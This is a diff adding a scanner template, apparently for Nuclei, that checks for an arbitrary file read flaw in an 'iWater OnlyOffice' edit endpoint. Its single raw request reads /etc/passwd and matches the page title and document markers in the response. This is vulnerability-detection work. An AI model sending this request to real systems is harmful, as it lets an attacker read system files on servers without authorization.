@@ -1,0 +1,28 @@
+id: poc-yaml-iwater-onlyoffice-edit-anyfile-read
+info:
+  name: iWater OnlyOffice Edit Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - raw:
+      - |
+        GET /onlyOffice/edit?userName=admin&&url=/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<title>passwd</title>"
+      - type: word
+        part: body
+        words:
+          - "type: \"desktop\""
+      - type: word
+        part: body
+        words:
+          - "documentType"
